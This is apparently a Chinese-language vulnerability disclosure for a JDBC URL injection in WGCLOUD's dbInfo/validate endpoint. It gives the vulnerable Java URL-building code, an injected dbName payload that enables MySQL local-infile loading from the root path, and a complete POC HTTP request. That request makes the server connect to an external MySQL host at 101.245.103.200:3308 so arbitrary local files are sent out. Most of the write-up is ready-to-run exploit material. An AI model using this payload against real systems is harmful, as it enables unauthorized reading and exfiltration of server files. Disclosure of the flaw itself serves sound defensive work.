# JDBCURL注入-任意文件读取

## 漏洞原理

`/wgcloud/dbInfo/validate`接口接收来自客户端传来的ip，port，dbname参数进行数据库连接，未过滤dbname参数，导致可以注入如下payload

```
dbName=test?allowLoadLocalInfile=true%26allowUrlInLocalInfile%3dtrue%26allowLoadLocalInfileInPath%3d/%26maxAllowedPacket%3d655360%26user%3df77b029#
```

该payload最后的`#`使得url_mysql后续的参数失效，读取了客户端传来的参数，导致任意文件读取

```java
public static final String url_mysql = "jdbc:mysql://{ip}:{port}/{dbname}?characterEncoding=utf-8&characterSetResults=utf8&autoReconnect=true&useSSL=false";

url = url.replace("{ip}", dbInfo.getIp()).replace("{port}", dbInfo.getPort()).replace("{dbname}", dbInfo.getDbName());
```

## POC

```http
POST /wgcloud/dbInfo/validate HTTP/1.1
Host: 192.168.239.1:9999
Content-Length: 234
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.239.1:9999
Referer: http://192.168.239.1:9999/wgcloud/dbInfo/edit
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=0C96F6F04CB5C61EE02C295AF843C61A
Connection: keep-alive

id=&aliasName=test&dbType=mysql&user=f77b029&passwd=root&ip=101.245.103.200&port=3308&dbName=aaaaa?allowLoadLocalInfile=true%26allowUrlInLocalInfile%3dtrue%26allowLoadLocalInfileInPath%3d/%26maxAllowedPacket%3d655360%26user%3df77b029#
```

